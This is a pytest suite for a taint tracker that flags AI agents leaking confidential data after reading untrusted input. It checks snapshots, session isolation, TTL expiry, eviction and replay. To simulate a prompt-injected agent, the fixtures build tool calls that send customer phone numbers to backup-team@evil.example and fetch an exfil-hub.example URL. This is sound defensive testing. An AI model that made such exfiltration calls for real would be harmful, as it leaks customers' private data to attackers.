"""Tracker state: snapshots, isolation, caps and eviction, TTL, replay purity, concurrency."""

from __future__ import annotations

import random
import threading

import pytest
from taint_helpers import (
    CUSTOMER_C017,
    CUSTOMERS,
    INBOX_ATTACK,
    PROFILES,
    Agent,
    FakeTaintSettings,
    codes,
    detection,
    resolve_sink,
)

from mirsad.models import Sensitivity, SessionSnapshot, ToolCall, ToolResult, Trust
from mirsad.taint import CODE_CONFIDENTIAL_TO_EXTERNAL, CODE_UNTRUSTED_DESTINATION, TaintTracker


class FakeClock:
    def __init__(self) -> None:
        self.now = 1000.0

    def __call__(self) -> float:
        return self.now


def test_snapshot_of_unknown_session_is_empty_and_created():
    tracker = TaintTracker()
    snap = tracker.snapshot("new-session", "agent-x")
    assert snap == SessionSnapshot(session_id="new-session", agent_id="agent-x")
    assert tracker.active_sessions() == 1


def test_snapshot_is_a_deep_copy():
    agent = Agent()
    agent.read("read_email", INBOX_ATTACK[0])
    snap = agent.tracker.snapshot(agent.session, agent.agent)
    snap.values[0].value = "tampered@evil.example"
    snap.untrusted_sources.clear()
    snap.values.clear()
    again = agent.tracker.snapshot(agent.session, agent.agent)
    assert again.tainted and again.values
    assert all(v.value != "tampered@evil.example" for v in again.values)


def test_register_result_updates_sources_sensitivity_injection_and_values():
    agent = Agent()
    result = agent.read("read_email", INBOX_ATTACK[0], detection=detection())
    snap = agent.tracker.register_result(
        ToolResult(
            call_id="c-crm",
            session_id=agent.session,
            agent_id=agent.agent,
            tool="get_customer",
            content="{}",
            structured=CUSTOMER_C017,
        ),
        PROFILES["get_customer"],
        None,
        agent.settings,
    )
    assert snap.untrusted_sources == [f"read_email:{result.call_id}"]
    assert snap.max_sensitivity == Sensitivity.CONFIDENTIAL
    assert snap.injection_detected
    crm = [v for v in snap.values if v.source_call_id == "c-crm"]
    assert {v.trust for v in crm} == {Trust.TRUSTED}
    assert any(v.kind == "phone" and v.field == "phone" for v in crm)
    assert any(v.kind == "ngram" and v.field == "notes" for v in crm)
    # n-grams are only kept for confidential results
    assert not any(v.kind == "ngram" and v.source_tool == "read_email" for v in snap.values)


def test_note_call_counts_calls():
    agent = Agent()
    call = agent.make_call("list_emails")
    agent.tracker.note_call(call)
    agent.tracker.note_call(call)
    assert agent.tracker.snapshot(agent.session, agent.agent).call_count == 2


def test_sessions_are_isolated_by_session_and_agent():
    tracker = TaintTracker()
    attacked = Agent(tracker, session="s1", agent="a1")
    attacked.read("read_email", INBOX_ATTACK[0])
    for other in (Agent(tracker, session="s2", agent="a1"), Agent(tracker, session="s1", agent="a2")):
        assert other.check("send_email", to="backup-team@evil.example", body="x") == []
    assert attacked.check("send_email", to="backup-team@evil.example", body="x")


def test_reset_one_session_or_all():
    tracker = TaintTracker()
    for session in ("s1", "s2"):
        Agent(tracker, session=session).read("read_email", INBOX_ATTACK[0])
    tracker.reset("s1")
    assert not tracker.snapshot("s1", Agent().agent).tainted
    assert tracker.snapshot("s2", Agent().agent).tainted
    tracker.reset()
    assert tracker.active_sessions() == 0


def test_value_cap_evicts_the_oldest_values():
    tracker = TaintTracker(max_values_per_session=20)
    agent = Agent(tracker)
    agent.read("read_email", {"id": "E1", "body": "first contact is old@evil.example"})
    for i in range(30):
        agent.read("read_email", {"body": f"contact person{i}@other.example"})
    snap = tracker.snapshot(agent.session, agent.agent)
    assert len(snap.values) <= 20
    assert all(v.value != "old@evil.example" for v in snap.values)
    assert any(v.value == "person29@other.example" for v in snap.values)
    # evicted values no longer drive the destination rule (bounded memory is a documented trade-off)
    assert CODE_UNTRUSTED_DESTINATION not in codes(agent.check("send_email", to="old@evil.example", body="x"))


def test_ngrams_may_use_at_most_half_of_the_budget():
    tracker = TaintTracker(max_values_per_session=40)
    agent = Agent(tracker)
    agent.read("get_customer", {"id": "C017", "phone": "0551234567"})
    long_note = " ".join(f"word{i}" for i in range(300))
    agent.read("get_customer", {"notes": long_note})
    snap = tracker.snapshot(agent.session, agent.agent)
    assert sum(v.kind == "ngram" for v in snap.values) == 20
    assert any(v.kind == "phone" for v in snap.values)  # identifiers were not flushed by the long text
    assert CODE_CONFIDENTIAL_TO_EXTERNAL in codes(
        agent.check("send_email", to="x@o.example", body="0551234567")
    )


def test_ngram_stride_reduces_storage_and_keeps_detection_of_longer_copies():
    tracker = TaintTracker(ngram_stride=4)
    agent = Agent(tracker)
    note = " ".join(f"token{i}" for i in range(41))
    agent.read("get_customer", {"notes": note})
    stored = sum(v.kind == "ngram" for v in tracker.snapshot(agent.session, agent.agent).values)
    assert stored == 10  # starts 0,4,...,32 (9 windows) plus the final window at 33
    copied = " ".join(f"token{i}" for i in range(13, 25))  # 12 words: guaranteed with stride 4 (8 + 4 - 1)
    assert CODE_CONFIDENTIAL_TO_EXTERNAL in codes(agent.check("send_email", to="x@o.example", body=copied))


def test_idle_sessions_expire_after_ttl():
    clock = FakeClock()
    tracker = TaintTracker(session_ttl_s=100, clock=clock)
    idle = Agent(tracker, session="idle")
    busy = Agent(tracker, session="busy")
    idle.read("read_email", INBOX_ATTACK[0])
    busy.read("read_email", INBOX_ATTACK[0])
    for _ in range(4):
        clock.now += 40
        busy.check("list_emails")  # activity keeps the busy session alive
        busy.read("read_email", INBOX_ATTACK[1])
    assert tracker.active_sessions() == 1
    assert not tracker.snapshot("idle", idle.agent).tainted
    assert tracker.snapshot("busy", busy.agent).tainted


def test_expired_session_is_dropped_even_before_a_sweep():
    clock = FakeClock()
    tracker = TaintTracker(session_ttl_s=10, clock=clock)
    agent = Agent(tracker)
    agent.read("read_email", INBOX_ATTACK[0])
    clock.now += 11
    assert agent.check("send_email", to="backup-team@evil.example", body="x") == []


def test_live_evaluation_does_not_create_or_change_sessions():
    tracker = TaintTracker()
    agent = Agent(tracker)
    assert agent.check("send_email", to="a@b.example", body="x") == []
    call = agent.make_call("send_email", to="a@b.example", body="x")
    minimal = tracker.minimal_snapshot(call, PROFILES["send_email"], "external", agent.settings)
    assert minimal.session_id == agent.session and minimal.values == []
    assert tracker.active_sessions() == 0


def _attack_session() -> tuple[Agent, ToolCall, list[ToolCall]]:
    agent = Agent()
    agent.read("list_emails", INBOX_ATTACK, detection=detection())
    agent.read("search_customers", CUSTOMERS)
    agent.read("get_customer", CUSTOMER_C017)
    calls = [
        agent.make_call("send_email", to="backup-team@evil.example", body="Faisal 0551234567, C018"),
        agent.make_call(
            "send_email", to="faisal.harbi@desert-foods.example", body="Your balance is 1,250,000"
        ),
        agent.make_call(
            "send_email", to="omar@gulf-retail.example", cc="sara@najd-trading.example", body="hi"
        ),
        agent.make_call("fetch_url", url="https://exfil-hub.example/x?p=%2B966501112233"),
        agent.make_call("delete_customer", customer_id="C018"),
        agent.make_call("send_email", to="huda@najd-trading.example", body="internal note"),
    ]
    return agent, calls[0], calls


def _evaluate(agent: Agent, call: ToolCall, snapshot: SessionSnapshot | None = None):
    profile = PROFILES[call.tool]
    sink = resolve_sink(profile, call.arguments)
    return agent.tracker.evaluate_call(call, profile, sink, agent.settings, snapshot=snapshot)


def test_replay_from_snapshot_reproduces_live_reasons_exactly():
    agent, _, calls = _attack_session()
    snap = agent.tracker.snapshot(agent.session, agent.agent)
    restored = SessionSnapshot.model_validate_json(snap.model_dump_json())  # as stored in the audit log
    fresh = TaintTracker()  # replay may run in another process
    for call in calls:
        live = _evaluate(agent, call)
        assert _evaluate(agent, call, snap) == live
        assert (
            fresh.evaluate_call(
                call,
                PROFILES[call.tool],
                resolve_sink(PROFILES[call.tool], call.arguments),
                agent.settings,
                snapshot=restored,
            )
            == live
        )
    assert fresh.active_sessions() == 0


def test_replay_is_pure_and_ignores_live_state():
    agent, call, _ = _attack_session()
    snap = agent.tracker.snapshot(agent.session, agent.agent)
    before = snap.model_dump()
    first = _evaluate(agent, call, snap)
    agent.tracker.reset()  # live state gone; replay must not care
    assert _evaluate(agent, call, snap) == first
    assert snap.model_dump() == before  # the input snapshot is not mutated
    assert _evaluate(agent, call) == []  # live evaluation now sees an empty session


def test_minimal_snapshot_is_smaller_and_replays_identically():
    agent, _, calls = _attack_session()
    full = agent.tracker.snapshot(agent.session, agent.agent)
    for call in calls:
        profile = PROFILES[call.tool]
        sink = resolve_sink(profile, call.arguments)
        live = _evaluate(agent, call)
        minimal = agent.tracker.minimal_snapshot(call, profile, sink, agent.settings)
        from_full = agent.tracker.minimal_snapshot(call, profile, sink, agent.settings, snapshot=full)
        assert minimal == from_full
        assert len(minimal.values) < len(full.values)
        assert minimal.untrusted_sources == full.untrusted_sources
        assert _evaluate(agent, call, minimal) == live


def test_minimal_snapshot_with_disabled_settings_keeps_only_flags():
    agent, call, _ = _attack_session()
    agent.settings = FakeTaintSettings(enabled=False)
    profile = PROFILES[call.tool]
    minimal = agent.tracker.minimal_snapshot(
        call, profile, resolve_sink(profile, call.arguments), agent.settings
    )
    assert minimal.values == [] and minimal.tainted and minimal.injection_detected


def test_constructor_validates_arguments():
    with pytest.raises(ValueError):
        TaintTracker(max_values_per_session=1)
    with pytest.raises(ValueError):
        TaintTracker(session_ttl_s=0)
    with pytest.raises(ValueError):
        TaintTracker(ngram_stride=0)


def test_concurrent_register_evaluate_and_snapshot_smoke():
    tracker = TaintTracker(max_values_per_session=200)
    errors: list[BaseException] = []
    sessions = [f"s{i}" for i in range(4)]

    def worker(seed: int) -> None:
        rng = random.Random(seed)
        try:
            for i in range(150):
                agent = Agent(tracker, session=rng.choice(sessions))
                op = rng.randrange(4)
                if op == 0:
                    agent.read(
                        "read_email",
                        {"id": f"E{i}", "from": f"p{i}@x.example", "body": f"mail m{i}@evil.example"},
                    )
                elif op == 1:
                    agent.read("get_customer", dict(CUSTOMER_C017, id=f"C{seed}{i:03d}"))
                elif op == 2:
                    agent.check("send_email", to=f"m{i}@evil.example", body="0551234567 " * 3)
                    tracker.note_call(agent.make_call("send_email"))
                else:
                    snap = tracker.snapshot(agent.session, agent.agent)
                    assert len(snap.values) <= 200
        except BaseException as exc:  # surfaced in the main thread
            errors.append(exc)

    threads = [threading.Thread(target=worker, args=(seed,)) for seed in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=60)
    assert not errors, errors[0]
    assert tracker.active_sessions() == len(sessions)
    total_calls = sum(tracker.snapshot(s, Agent().agent).call_count for s in sessions)
    assert total_calls > 0
